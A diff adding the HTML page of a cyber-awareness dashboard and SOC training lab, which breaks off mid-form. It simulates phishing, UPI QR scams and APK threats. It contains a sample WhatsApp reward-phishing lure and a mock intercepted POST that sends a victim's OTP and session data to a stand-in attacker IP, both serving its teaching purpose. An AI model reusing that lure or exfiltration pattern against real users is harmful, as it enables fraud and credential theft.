@@ -1,0 +1,771 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CyberShield • Personalized AI Agent for Privacy Protection</title>
+    <link rel="icon" type="image/x-icon" href="/static/icon.ico">
+    <link rel="stylesheet" href="/static/css/style.css">
+    <link rel="stylesheet" href="desktop_ui/static/css/style.css">
+</head>
+<body>
+
+    <!-- =======================================================
+         1. STARTUP WELCOME & CYBER AWARENESS POPUP MODAL
+         ======================================================= -->
+    <div id="startup-welcome-modal" class="modal-overlay">
+        <div class="welcome-modal-card">
+            
+            <!-- Avatar & Greeting Header -->
+            <div class="modal-avatar-header">
+                <div class="avatar-badge">🛡️</div>
+                <div class="modal-title-group">
+                    <h2>🎉 Welcome to CyberShield AI Privacy Defense</h2>
+                    <p>Personalized AI Agent for Privacy Protection in Mobile Personal Apps</p>
+                </div>
+            </div>
+
+            <!-- Real-World Fraud & Cyber Threat Reality Statistics -->
+            <div class="stats-awareness-grid">
+                <div class="stat-awareness-box">
+                    <div class="stat-awareness-icon">🌐</div>
+                    <div class="stat-awareness-val">3.4 Billion+</div>
+                    <div class="stat-awareness-label">Phishing & malicious messages sent across chats and emails daily</div>
+                </div>
+                <div class="stat-awareness-box">
+                    <div class="stat-awareness-icon">🇮🇳</div>
+                    <div class="stat-awareness-val">5,000+ Daily</div>
+                    <div class="stat-awareness-label">Citizen cyber fraud complaints logged across India every 24 hours</div>
+                </div>
+                <div class="stat-awareness-box">
+                    <div class="stat-awareness-icon">⏱️</div>
+                    <div class="stat-awareness-val">35+ Victims / Min</div>
+                    <div class="stat-awareness-label">Trapped every 60 seconds by digital arrest, fake loans & UPI scams</div>
+                </div>
+            </div>
+
+            <!-- Empowering Positive Defender Message -->
+            <div class="positive-defender-banner">
+                <div class="positive-defender-icon">🚀</div>
+                <div class="positive-defender-text">
+                    <h4>🌟 You Are Taking a Conscious, Empowered Step!</h4>
+                    <p>
+                        While millions of mobile phone and PC users unknowingly fall victim to silent background trackers, deceptive payment QR traps, and credential theft, you have chosen to take proactive control. You are stepping into the world of cyber defense to protect your personal privacy and understand how attacks work from the inside out.
+                    </p>
+                </div>
+            </div>
+
+            <!-- Enter Dashboard Button -->
+            <button id="btn-enter-dashboard" class="btn-enter-dashboard">
+                🚀 Launch Protection Command Center →
+            </button>
+        </div>
+    <!-- =======================================================
+         1.1 REAL MOBILE DEVICE PAIRING QR MODAL
+         ======================================================= -->
+    <div id="mobile-pairing-modal" class="modal-overlay" style="display: none;">
+        <div class="welcome-modal-card" style="max-width: 540px; text-align: center;">
+            <div class="modal-avatar-header" style="justify-content: center; margin-bottom: 12px;">
+                <div class="avatar-badge">📱</div>
+                <div class="modal-title-group" style="text-align: left;">
+                    <h2>Connect Real Mobile Phone</h2>
+                    <p>Live Wi-Fi Telemetry & Real-Time Threat Monitoring Link</p>
+                </div>
+            </div>
+
+            <div style="background: #ffffff; display: inline-block; padding: 14px; border-radius: 14px; margin: 10px 0; box-shadow: 0 0 20px rgba(0, 240, 255, 0.3);">
+                <img id="pairing-qr-img" src="" alt="Pairing QR Code" width="190" height="190" style="display: block;">
+            </div>
+
+            <div style="font-size: 0.85rem; color: var(--text-muted); margin-bottom: 6px;">Or open this direct URL on your phone browser:</div>
+            <div id="pairing-url-text" style="background: rgba(0,0,0,0.5); border: 1px solid var(--accent-cyan); border-radius: 8px; padding: 10px; font-family: monospace; font-size: 14px; color: var(--accent-green); word-break: break-all; margin-bottom: 14px;">
+                http://10.247.156.117:8000/mobile
+            </div>
+
+            <div style="background: rgba(255,255,255,0.04); border-radius: 10px; padding: 12px; font-size: 0.82rem; color: var(--text-muted); text-align: left; line-height: 1.5; margin-bottom: 16px;">
+                • Connect your phone to the same Wi-Fi / Laptop Hotspot.<br>
+                • Open the URL in Google Chrome (Android) or Safari (iOS).<br>
+                • The phone opens in <strong>Normal Mode only</strong> and streams live alerts to this Laptop SOC!
+            </div>
+
+            <div style="display: flex; gap: 10px; justify-content: center;">
+                <button id="btn-close-pairing-modal" class="btn-enter-dashboard" style="background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); width: auto; padding: 10px 20px;">
+                    Close
+                </button>
+                <a id="btn-open-mobile-tab" href="/mobile" target="_blank" class="btn-enter-dashboard" style="text-decoration: none; display: inline-flex; align-items: center; justify-content: center; width: auto; padding: 10px 20px;">
+                    Open Mobile View in New Tab
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <!-- =======================================================
+         2. MAIN DASHBOARD APPLICATION
+         ======================================================= -->
+    <div class="app-container">
+        
+        <!-- Header -->
+        <header>
+            <div class="brand-title">
+                <div class="brand-badge-row">
+                    <div class="pulse-indicator"></div>
+                    <h1>🛡️ CyberShield AI &bull; Personal Privacy Protection Agent</h1>
+                </div>
+                <p>Cross-Platform Security & Privacy Monitoring • Real-Time AI Threat Explanation</p>
+                <div class="endpoint-status-bar">
+                    <span id="mobile-endpoint-pill" class="endpoint-pill" style="border-color: rgba(0, 240, 255, 0.4);">
+                        <span id="mobile-dot" class="dot-green"></span>
+                        📱 Real Mobile: <strong id="mobile-status-text" style="color: var(--accent-green); margin-left: 4px;">Connecting...</strong>
+                    </span>
+                    <span class="endpoint-pill">
+                        <span class="dot-blue"></span>
+                        💻 Laptop SOC: <strong style="color: var(--accent-blue); margin-left: 4px;">Audited (Localhost:8000)</strong>
+                    </span>
+                    <button id="btn-open-pairing-modal" class="btn-sound-toggle" style="background: linear-gradient(135deg, rgba(0,240,255,0.2), rgba(0,119,255,0.2)); border-color: var(--accent-cyan); color: var(--accent-cyan); font-weight: 700;">
+                        📲 Connect Real Phone (QR Code)
+                    </button>
+                </div>
+            </div>
+
+            <div class="header-controls">
+                <!-- Sound Toggle -->
+                <button id="btn-toggle-sound" class="btn-sound-toggle" title="Toggle Audio Feedback">
+                    🔊 Sound: ON
+                </button>
+
+                <!-- Top Mode Switcher Buttons -->
+                <div class="top-mode-switcher">
+                    <button id="top-btn-normal" class="mode-toggle-btn active-normal">
+                        👤 Normal Mode
+                    </button>
+                    <button id="top-btn-student" class="mode-toggle-btn">
+                        🎓 Student Mode (SOC Lab)
+                    </button>
+                </div>
+
+                <!-- Dynamic Privacy Score -->
+                <div class="score-chip">
+                    <div class="score-dial-mini">
+                        <span id="stat-score-num">84</span>
+                    </div>
+                    <div>
+                        <span style="font-size: 0.72rem; text-transform: uppercase; letter-spacing: 0.05em; color: var(--text-muted);">Privacy Score</span>
+                        <div id="stat-score" style="font-weight: 700; color: #fff;">84 / 100 🟢</div>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <!-- Summary Metric Cards -->
+        <div class="stat-row">
+            <div class="stat-box orange">
+                <div class="stat-box-info">
+                    <h4>Active Interceptions</h4>
+                    <div class="stat-val" id="stat-threats-count">3</div>
+                    <span class="stat-subtext">Messaging & QR traps stopped</span>
+                </div>
+                <div class="stat-box-icon">🚨</div>
+            </div>
+            <div class="stat-box green">
+                <div class="stat-box-info">
+                    <h4>Outbound Trackers Blocked</h4>
+                    <div class="stat-val" id="stat-trackers-count">5</div>
+                    <span class="stat-subtext">Telemetry leaked dropped by VPN</span>
+                </div>
+                <div class="stat-box-icon">🛡️</div>
+            </div>
+            <div class="stat-box cyan">
+                <div class="stat-box-info">
+                    <h4>Unpatched CVEs</h4>
+                    <div class="stat-val" id="stat-vulns-count">3</div>
+                    <span class="stat-subtext">Known software vulnerabilities</span>
+                </div>
+                <div class="stat-box-icon">⚠️</div>
+            </div>
+            <div class="stat-box purple">
+                <div class="stat-box-info">
+                    <h4>Agent Engine</h4>
+                    <div class="stat-val" id="stat-engine-status" style="font-size: 1.15rem; margin-top: 4px;">Active &amp; Shielding</div>
+                    <span class="stat-subtext">Heuristic NLP &amp; OCR Engine</span>
+                </div>
+                <div class="stat-box-icon">🤖</div>
+            </div>
+        </div>
+
+        <!-- =======================================================
+             3. DUAL-PANEL WORKSPACE: SMARTPHONE MOCKUP + CONSOLE
+             ======================================================= -->
+        <div class="main-workspace">
+            
+            <!-- LEFT PANEL: INTERACTIVE SMARTPHONE MOCKUP -->
+            <div class="phone-column">
+                
+                <!-- Phone App Launcher Dock (Switch between simulated phone apps) -->
+                <div class="phone-app-switcher">
+                    <button class="app-switch-btn active" data-app="whatsapp" title="WhatsApp Messenger">
+                        💬 WhatsApp
+                    </button>
+                    <button class="app-switch-btn" data-app="upi" title="UPI Payment Scanner">
+                        💳 UPI Pay
+                    </button>
+                    <button class="app-switch-btn" data-app="apk" title="Package Installer">
+                        📦 APK Install
+                    </button>
+                    <button class="app-switch-btn" data-app="clipboard" title="Clipboard Guard">
+                        📋 Clipboard
+                    </button>
+                </div>
+
+                <!-- Smartphone Frame -->
+                <div class="phone-wrapper">
+                    <!-- Notch -->
+                    <div class="phone-notch">
+                        <div class="notch-cam"></div>
+                        <div class="notch-speaker"></div>
+                    </div>
+                    <!-- Status Bar -->
+                    <div class="phone-status-bar">
+                        <span id="phone-clock">18:45</span>
+                        <span>📶 5G &bull; 95% 🔋</span>
+                    </div>
+
+                    <!-- App View Container (Dynamically rendered depending on active app) -->
+                    <div id="phone-app-viewport" class="phone-viewport">
+                        <!-- Default: WhatsApp View -->
+                        <div class="chat-app-header">
+                            <div class="chat-avatar">💬</div>
+                            <div class="chat-info">
+                                <h5 id="phone-chat-sender">+91 98480 22319</h5>
+                                <span>WhatsApp &bull; Encrypted Channel</span>
+                            </div>
+                        </div>
+                        <div class="phone-screen-body" id="phone-chat-screen">
+                            <div class="chat-bubble incoming">
+                                🎁 Festive Reward! You won ₹50,000 cash! Click link to claim:
+                                <br><a class="fake-link" href="#" onclick="return false;">http://festival-reward-claim.online/claim.php</a>
+                            </div>
+                            <div class="agent-intercept-badge">
+                                <strong>🛡️ CYBERSHIELD AGENT ACTIVE</strong><br>
+                                🚨 Suspicious Phishing Link Blocked before Webview launch.
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Simulation Trigger Buttons -->
+                <div class="phone-sim-triggers">
+                    <h5>Simulate Attack Vectors:</h5>
+                    <div class="sim-btn-grid">
+                        <button class="btn-sim" id="sim-wa-phish">📩 WhatsApp Phishing</button>
+                        <button class="btn-sim" id="sim-qr-scam">📷 Deceptive UPI QR</button>
+                        <button class="btn-sim" id="sim-apk-download">📁 Insecure APK File</button>
+                        <button class="btn-sim" id="sim-clipboard-pii">📋 Clipboard PII Leak</button>
+                    </div>
+
+                    <!-- Custom Payload Analyzer -->
+                    <div class="custom-payload-box">
+                        <label for="custom-payload-input">Custom Payload Analyzer:</label>
+                        <div class="custom-input-row">
+                            <input type="text" id="custom-payload-input" placeholder="Paste URL, SMS, or UPI string..." autocomplete="off">
+                            <button id="btn-analyze-custom" class="btn-sim" style="width: auto; background: var(--accent-blue); color: #fff;">Inspect ↵</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- RIGHT PANEL: DETAILED SECURITY CONSOLE -->
+            <div class="console-column">
+                
+                <!-- Navigation Tabs -->
+                <div class="nav-tab-bar">
+                    <button class="console-tab-btn active" id="tab-btn-threats" data-tab="pane-threats">
+                        🚨 Live Threat Alerts
+                    </button>
+                    <!-- Conditional Sandbox Tab: Visible in Student Mode -->
+                    <button class="console-tab-btn" id="tab-btn-sandbox" data-tab="pane-sandbox">
+                        🧪 Defense Sandbox Lab
+                    </button>
+                    <button class="console-tab-btn" id="tab-btn-vulns" data-tab="pane-vulns">
+                        💻 Outdated Software (CVEs)
+                    </button>
+                    <button class="console-tab-btn" id="tab-btn-trackers" data-tab="pane-trackers">
+                        📡 Tracker Radar
+                    </button>
+                    <button class="console-tab-btn" id="tab-btn-lab-modal" onclick="openDefenseLab()">
+                        🔬 Launch SOC Virtual Lab
+                    </button>
+                </div>
+
+                <!-- TAB 1: LIVE THREATS (NORMAL VIEW VS. STUDENT FORENSICS) -->
+                <div id="pane-threats" class="tab-pane active">
+                    <!-- Threat Filter Controls -->
+                    <div class="threat-filter-strip">
+                        <span style="font-size: 0.8rem; color: var(--text-secondary); margin-right: 6px;">Filter:</span>
+                        <button class="btn-filter active" data-filter="ALL">All Alerts</button>
+                        <button class="btn-filter" data-filter="CRITICAL">Critical</button>
+                        <button class="btn-filter" data-filter="HIGH">High</button>
+                        <button class="btn-filter" data-filter="WHATSAPP">WhatsApp</button>
+                        <button class="btn-filter" data-filter="UPI_QR">UPI</button>
+                    </div>
+
+                    <div class="threat-card-container" id="threat-cards-container">
+                        <!-- Populated by JavaScript -->
+                    </div>
+                </div>
+
+                <!-- TAB 2: INTERACTIVE DEFENSE SANDBOX LAB (STUDENT EXCLUSIVE) -->
+                <div id="pane-sandbox" class="tab-pane">
+                    <div class="sandbox-lab-card">
+                        
+                        <div class="sandbox-header">
+                            <div>
+                                <h3 style="color: var(--accent-purple); font-size: 1.25rem;">
+                                    🧪 Cybersecurity Defense Sandbox Lab
+                                </h3>
+                                <p style="font-size: 0.82rem; color: var(--text-secondary);">
+                                    Test your defensive programming countermeasure against active mobile exploit vectors.
+                                </p>
+                            </div>
+                            <span style="font-family: var(--font-code); font-size: 0.78rem; color: var(--accent-blue); background: var(--bg-primary); padding: 5px 12px; border-radius: 8px; border: 1px solid var(--border-color);">
+                                ISOLATED VIRTUAL CONTAINER
+                            </span>
+                        </div>
+
+                        <!-- Step 1 & Step 2 Badges -->
+                        <div class="sandbox-step-row">
+                            <span class="step-chip auto-defense">
+                                ✓ Step 1: System Auto-Defense (Neutralized in Real-Time)
+                            </span>
+                            <span class="step-chip student-challenge">
+                                ⚡ Step 2: Student Challenge (Practice Defensive Mitigation)
+                            </span>
+                        </div>
+
+                        <!-- Scenario Selector -->
+                        <div style="margin-bottom: 14px;">
+                            <label style="font-size: 0.82rem; color: var(--text-secondary); font-weight: 600;">Active Threat Scenario:</label>
+                            <select id="sandbox-scenario-select" style="width: 100%; margin-top: 6px; background: #0f172a; border: 1px solid #334155; color: #fff; padding: 9px 12px; border-radius: 8px;">
+                                <option value="WA_PHISH">1. Social Engineering Phishing Link (WhatsApp Vector)</option>
+                                <option value="UPI_QR">2. Deceptive UPI Reverse Debit Intent (Payment Trap)</option>
+                                <option value="APK_DOWNLOAD">3. Trojanized Sideloaded APK Dropper (Excessive Permissions)</option>
+                                <option value="CLIPBOARD_PII">4. Background Clipboard Sensitive PII Snooping</option>
+                            </select>
+                        </div>
+
+                        <!-- Active Scenario Replay Details -->
+                        <div class="sandbox-scenario-replay" id="sandbox-active-scenario">
+                            <strong style="color: var(--text-primary);">Scenario Context:</strong> Social Engineering Phishing Link (WhatsApp Interception)<br>
+                            <span style="color: var(--text-secondary); font-size: 0.85rem;">
+                                An attacker crafted a fast-flux credential harvesting portal disguised as a festive reward. CyberShield safely blocked the link on the user's phone. Now, how will you defend against this vector in your own code?
+                            </span>
+                        </div>
+
+                        <h4 style="font-size: 0.95rem; color: var(--text-primary); margin-bottom: 10px;">
+                            Select Your Defensive Countermeasure Rule:
+                        </h4>
+
+                        <!-- Interactive Defense Rule Selector -->
+                        <div class="defense-options-grid">
+                            <div class="defense-option active-option" data-rule="CSP_FORM_ACTION_RESTRICTION">
+                                <h5>1. Content Security Policy (CSP)</h5>
+                                <p>Inject `form-action 'self'` header to prevent forms from submitting credentials to external fast-flux IPs.</p>
+                            </div>
+                            <div class="defense-option" data-rule="UPI_INTENT_PARAM_VALIDATION">
+                                <h5>2. Strict UPI Intent Validation</h5>
+                                <p>Parse incoming `upi://pay` URI schemes. If parameter `am > 0`, intercept and require explicit biometric confirmation.</p>
+                            </div>
+                            <div class="defense-option" data-rule="ANDROID_RECEIVE_SMS_REVOCATION">
+                                <h5>3. Android Permission Least-Privilege</h5>
+                                <p>Strip `android.permission.RECEIVE_SMS` and `RECORD_AUDIO` from side-loaded third-party APK manifests.</p>
+                            </div>
+                            <div class="defense-option" data-rule="DNS_SINKHOLING_FAST_FLUX">
+                                <h5>4. DNS-over-HTTPS Sinkholing</h5>
+                                <p>Deploy on-device local DNS sinkholing via VpnService to drop queries to unverified domain registrars.</p>
+                            </div>
+                        </div>
+
+                        <div style="display: flex; gap: 12px; align-items: center; flex-wrap: wrap;">
+                            <button id="btn-test-defense" class="btn-deploy-sandbox">
+                                ⚡ Deploy Defensive Rule in Sandbox
+                            </button>
+                            <button class="btn-player" onclick="openDefenseLab()" style="background: #1e293b; color: #fff; padding: 11px 18px; border-radius: 10px;">
+                                🔬 Open Virtual SOC Lab Simulator →
+                            </button>
+                        </div>
+
+                        <!-- Sandbox Evaluation Results -->
+                        <div id="sandbox-result" class="sandbox-result-box" style="display: none;">
+                            <!-- Populated on test -->
+                        </div>
+                    </div>
+                </div>
+
+                <!-- TAB 3: SOFTWARE VULNERABILITIES & CVEs -->
+                <div id="pane-vulns" class="tab-pane">
+                    <div style="background: var(--bg-card); padding: 18px 22px; border-radius: 14px; margin-bottom: 16px; border: 1px solid var(--border-color); display: flex; justify-content: space-between; align-items: center; box-shadow: var(--shadow-sm); flex-wrap: wrap; gap: 12px;">
+                        <div>
+                            <h3 style="color: var(--accent-blue); font-size: 1.1rem;">Outdated Software &amp; CVE Vulnerability Management</h3>
+                            <p style="font-size: 0.84rem; color: var(--text-secondary);">
+                                Audits installed applications across Windows &amp; Android against the National Vulnerability Database (NVD) to prevent zero-day and unpatched exploits.
+                            </p>
+                        </div>
+                        <button id="btn-rescan-cve" class="btn-sim" style="font-size: 0.8rem; padding: 8px 16px; width: auto; background: var(--accent-blue); color: #fff;">
+                            🔄 Re-Scan Endpoints
+                        </button>
+                    </div>
+                    <div style="overflow-x: auto;">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Software Name</th>
+                                    <th>Installed</th>
+                                    <th>Patched Baseline</th>
+                                    <th>CVE Identifier</th>
+                                    <th>CVSS Risk</th>
+                                    <th>Vulnerability Summary</th>
+                                    <th>Action</th>
+                                </tr>
+                            </thead>
+                            <tbody id="vuln-table-body">
+                                <!-- Populated by JavaScript -->
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <!-- TAB 4: OUTBOUND TRACKER RADAR -->
+                <div id="pane-trackers" class="tab-pane">
+                    <div style="background: var(--bg-card); padding: 18px 22px; border-radius: 14px; margin-bottom: 16px; border: 1px solid var(--border-color); box-shadow: var(--shadow-sm);">
+                        <h3 style="color: var(--accent-green); font-size: 1.1rem;">Mobile Personal Apps Outbound Telemetry &amp; Tracker Filter</h3>
+                        <p style="font-size: 0.84rem; color: var(--text-secondary);">
+                            Filtered background requests from mobile personal apps attempting to leak device identifiers, clipboard buffers, or location telemetry.
+                        </p>
+                    </div>
+                    <div style="overflow-x: auto;">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Application &amp; Package</th>
+                                    <th>Target Telemetry Domain</th>
+                                    <th>Tracker Category</th>
+                                    <th>Intervention Status</th>
+                                </tr>
+                            </thead>
+                            <tbody id="tracker-table-body">
+                                <!-- Populated by JavaScript -->
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+
+    </div>
+
+    <!-- =======================================================
+         9. IMMERSIVE VIRTUAL CYBER DEFENSE LAB WORKSPACE
+         ======================================================= -->
+    <div id="virtual-lab-modal" class="virtual-lab-overlay hidden">
+        
+        <!-- Lab Top Bar -->
+        <div class="lab-top-navbar">
+            <div class="lab-brand">
+                <span class="lab-brand-badge">SOC LAB v2.4</span>
+                <div class="lab-brand-title">
+                    <h3>🛡️ Virtual Cyber Defense Lab &bull; SOC Practice Workspace</h3>
+                    <p id="lab-case-file-title">CASE FILE #WA-2026-PHISH // TARGET: MOBILE MESSAGING VECTOR</p>
+                </div>
+            </div>
+
+            <div class="lab-controls-group">
+                <!-- Red Team vs Blue Team Toggle -->
+                <div class="team-perspective-toggle">
+                    <button id="btn-blue-team" class="btn-team-toggle active-blue">
+                        🔵 Blue Team (Defender)
+                    </button>
+                    <button id="btn-red-team" class="btn-team-toggle">
+                        🔴 Red Team (Attacker)
+                    </button>
+                </div>
+
+                <div class="lab-status-chip">
+                    NODE: 10.0.8.14 [SANDBOX ISOLATED]
+                </div>
+
+                <button id="btn-close-lab" class="btn-exit-lab">
+                    ✕ Exit Lab
+                </button>
+            </div>
+        </div>
+
+        <!-- Lab Main Grid -->
+        <div class="lab-workspace-grid">
+            
+            <!-- LEFT PANEL: ATTACK RECONSTRUCTION & DOSSIER -->
+            <div class="lab-left-panel">
+                
+                <!-- Attack Reconstruction Animated Player -->
+                <div class="attack-player-card">
+                    <div class="player-header">
+                        <span class="player-title">
+                            ▶ Animated Attack Vector Playback // Visual Reconstruction
+                        </span>
+                        <span id="player-step-badge" style="font-family: var(--font-code); font-size: 0.75rem; color: #a855f7;">
+                            STAGE 1 OF 5
+                        </span>
+                    </div>
+
+                    <!-- Animation Canvas / Stage -->
+                    <div class="attack-animation-stage" id="anim-stage">
+                        <div class="attack-flow-diagram">
+                            <div class="flow-track">
+                                <div class="flowing-packet" id="anim-packet" style="left: 10px;"></div>
+                            </div>
+                            <!-- Node 1: Attacker C2 -->
+                            <div class="flow-node active-node" id="node-attacker">
+                                <div class="flow-node-icon">😈</div>
+                                <div class="flow-node-label">Threat C2</div>
+                            </div>
+                            <!-- Node 2: WhatsApp Link -->
+                            <div class="flow-node" id="node-whatsapp">
+                                <div class="flow-node-icon">💬</div>
+                                <div class="flow-node-label">WhatsApp</div>
+                            </div>
+                            <!-- Node 3: Phishing Webview -->
+                            <div class="flow-node" id="node-webview">
+                                <div class="flow-node-icon">🌐</div>
+                                <div class="flow-node-label">Webview</div>
+                            </div>
+                            <!-- Node 4: Victim -->
+                            <div class="flow-node victim-node" id="node-victim">
+                                <div class="flow-node-icon">👤</div>
+                                <div class="flow-node-label">Victim</div>
+                            </div>
+                            <!-- Node 5: Defense Rule -->
+                            <div class="flow-node defense-node" id="node-defense">
+                                <div class="flow-node-icon">🛡️</div>
+                                <div class="flow-node-label">Your Policy</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Timeline Scrubber & Step Markers -->
+                    <div class="timeline-scrubber-track">
+                        <div id="anim-progress-bar" class="timeline-progress" style="width: 20%;"></div>
+                    </div>
+                    <div class="step-markers-row">
+                        <button type="button" class="step-marker-btn active-step" data-step="1">1. Threat C2</button>
+                        <button type="button" class="step-marker-btn" data-step="2">2. WhatsApp Link</button>
+                        <button type="button" class="step-marker-btn" data-step="3">3. Webview</button>
+                        <button type="button" class="step-marker-btn" data-step="4">4. Exploit Form</button>
+                        <button type="button" class="step-marker-btn" data-step="5">5. Policy Intercept</button>
+                    </div>
+
+                    <!-- Caption Bar -->
+                    <div class="player-caption-bar" id="player-caption">
+                        <strong>Step 1:</strong> Attacker sets up a rogue fast-flux server (198.51.100.24) and disguises a form harvesting script as a ₹50,000 festival cashback claim.
+                    </div>
+
+                    <!-- Player Controls -->
+                    <div class="player-controls-bar">
+                        <div class="player-btn-group">
+                            <button class="btn-player" id="btn-play-anim">▶ Play Vector</button>
+                            <button class="btn-player" id="btn-pause-anim">⏸ Pause</button>
+                            <button class="btn-player" id="btn-restart-anim">↺ Replay</button>
+                        </div>
+                        <span style="font-size: 0.75rem; color: #64748b; font-family: var(--font-code);">
+                            AUTO-SIMULATION ENGINE
+                        </span>
+                    </div>
+                </div>
+
+                <!-- Threat Intelligence Dossier -->
+                <div class="threat-dossier-card">
+                    <div class="dossier-header">THREAT INTELLIGENCE DOSSIER // TECHNICAL TARGETS</div>
+                    
+                    <div class="dossier-row">
+                        <span class="dossier-label">Tactical Vector &amp; Protocol</span>
+                        <span class="dossier-val" id="dossier-protocol">HTTP/1.1 POST Form Injection over HTTPS Webview</span>
+                    </div>
+
+                    <div class="dossier-row">
+                        <span class="dossier-label">MITRE ATT&amp;CK Taxonomy</span>
+                        <span class="dossier-val" id="dossier-mitre" style="color: #38bdf8;">T1566.002 (Spearphishing Link) &bull; T1059 (Command &amp; Scripting)</span>
+                    </div>
+
+                    <div class="dossier-row">
+                        <span class="dossier-label">Target Assets</span>
+                        <span class="dossier-val" id="dossier-targets" style="color: #f97316;">Bank Account Session, SMS OTP Token, Personal Identity Data</span>
+                    </div>
+
+                    <div class="dossier-row">
+                        <span class="dossier-label">Common Weakness Enumeration</span>
+                        <span class="dossier-val" id="dossier-cwe">CWE-79 (Improper Neutralization), CWE-352 (Cross-Site Request Forgery)</span>
+                    </div>
+                </div>
+
+            </div>
+
+            <!-- RIGHT PANEL: REAL-TIME DEFENSE TOOLS SUITE & ATTACK DETONATION -->
+            <div class="lab-right-panel">
+                
+                <!-- Tools Suite -->
+                <div class="tools-suite-card">
+                    <div class="tool-tab-strip">
+                        <button class="btn-tool-tab active" data-tool="tool-packet">
+                            📡 Packet &amp; Header Inspector
+                        </button>
+                        <button class="btn-tool-tab" data-tool="tool-dns">
+                            🌐 DNS &amp; WHOIS Threat Intel
+                        </button>
+                        <button class="btn-tool-tab" data-tool="tool-policy">
+                            🛠️ Defensive Policy Editor
+                        </button>
+                    </div>
+
+                    <!-- Tool 1: Packet Inspector (Wireshark / Burp Style) -->
+                    <div id="tool-packet" class="tool-pane active">
+                        <div style="font-size: 0.78rem; color: #94a3b8; margin-bottom: 10px;">
+                            INTERCEPTED RAW HTTP TRAFFIC STREAM:
+                        </div>
+                        <div class="packet-stream-box" id="packet-stream-content">
+<span class="packet-method">POST</span> <span class="packet-url">/collect.php HTTP/1.1</span>
+<span class="packet-header-key">Host:</span> <span class="packet-header-val">198.51.100.24 (festival-reward-claim.online)</span>
+<span class="packet-header-key">User-Agent:</span> <span class="packet-header-val">Mozilla/5.0 (Linux; Android 14; iQOO Z9x) Mobile</span>
+<span class="packet-header-key">Content-Type:</span> <span class="packet-header-val">application/x-www-form-urlencoded</span>
+<span class="packet-header-key">Referer:</span> <span class="packet-header-val">https://whatsapp.session/msg_ref_982</span>
+<span class="packet-header-key">Content-Length:</span> <span class="packet-header-val">68</span>
+
+<span class="packet-payload">[FORM PAYLOAD EXFILTRATION]:</span>
+<span style="color: #f43f5e;">victim_user=gadupudi071&amp;otp_token=894120&amp;session=wa_active_291</span>
+                        </div>
+                    </div>
+
+                    <!-- Tool 2: DNS & WHOIS Lookup -->
+                    <div id="tool-dns" class="tool-pane">
+                        <div style="font-size: 0.78rem; color: #94a3b8; margin-bottom: 10px;">
+                            THREAT INTELLIGENCE REPUTATION LOOKUP:
+                        </div>
+                        <div class="packet-stream-box" id="dns-stream-content">
+[WHOIS RECORD]:
+  Domain: festival-reward-claim.online
+  Registrar: NameCheap, Inc.
+  Creation Date: 2026-09-12T14:22:00Z (Age: &lt; 48 hours)
+  Nameservers: ns1.fastflux-shield.su, ns2.fastflux-shield.su
+  IP Address: 198.51.100.24 (Autonomous System: AS45102 Bulletproof)
+  Risk Score: 98/100 [CRITICAL PHISHING HOST]
+                        </div>
+                    </div>
+
+                    <!-- Tool 3: Defensive Policy & Code Editor -->
+                    <div id="tool-policy" class="tool-pane">
+                        <div style="font-size: 0.78rem; color: #94a3b8; margin-bottom: 10px;">
+                            CONFIGURE ACTIVE DEFENSE POLICY:
+                        </div>
+                        <select id="lab-policy-select" style="margin-bottom: 12px; background: #0f172a; border-color: #334155; color: #fff; width: 100%; padding: 8px; border-radius: 6px;">
+                            <option value="CSP_POLICY">Content Security Policy (CSP): Enforce form-action 'self'</option>
+                            <option value="DNS_SINKHOLE">DNS-over-HTTPS Sinkhole: Drop fast-flux queries</option>
+                            <option value="NO_POLICY">None (Allow All Traffic - Vulnerable Baseline)</option>
+                        </select>
+                        <div class="packet-stream-box" id="lab-policy-preview">
+Content-Security-Policy: default-src 'self'; form-action 'self' https://trusted-bank.com;
+// This directive instructs the browser engine to drop any form POST attempting
+// to send victim credentials to external IP 198.51.100.24!
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Stage 4: Safe Attack Detonation Engine -->
+                <div class="detonation-section">
+                    <div class="detonation-header">
+                        <div>
+                            <h4 style="color: #fff; font-size: 1.05rem;">
+                                ⚡ Safe Attack Detonation Engine
+                            </h4>
+                            <p style="font-size: 0.8rem; color: #94a3b8;">
+                                Fire the simulated attack payload against your configured defense node in this isolated sandbox.
+                            </p>
+                        </div>
+
+                        <button id="btn-fire-detonation" class="btn-fire-attack">
+                            🔥 Launch Attack Against My Node
+                        </button>
+                    </div>
+
+                    <!-- Quick Clickable Command Chips -->
+                    <div class="cli-chips-row">
+                        <span class="cli-chip-label">Quick Commands:</span>
+                        <button type="button" class="cli-chip" onclick="executeCliCommand('help')">help</button>
+                        <button type="button" class="cli-chip" onclick="executeCliCommand('nmap 10.0.8.14')">nmap 10.0.8.14</button>
+                        <button type="button" class="cli-chip" onclick="executeCliCommand('inspect-packet')">inspect-packet</button>
+                        <button type="button" class="cli-chip" onclick="executeCliCommand('whois')">whois</button>
+                        <button type="button" class="cli-chip" onclick="executeCliCommand('policy csp')">policy csp</button>
+                        <button type="button" class="cli-chip" onclick="executeCliCommand('policy sinkhole')">policy sinkhole</button>
+                        <button type="button" class="cli-chip" onclick="executeCliCommand('detonate')">detonate</button>
+                        <button type="button" class="cli-chip" onclick="executeCliCommand('clear')">clear</button>
+                    </div>
+
+                    <!-- Live SOC Terminal Stream -->
+                    <div class="live-soc-terminal" id="soc-terminal">
+                        <div class="terminal-line">[SOC-KERNEL] Virtual Defense Node 10.0.8.14 initialized.</div>
+                        <div class="terminal-line">[SOC-KERNEL] Monitoring ports: 80, 443 (HTTP/TLS).</div>
+                        <div class="terminal-line">[SOC-KERNEL] Interactive terminal active. Type 'help' to see available security commands.</div>
+                    </div>
+
+                    <!-- Interactive Command Input Bar -->
+                    <form id="terminal-cli-form" class="terminal-input-bar">
+                        <span class="terminal-prompt-label">root@cybershield-soc:~#</span>
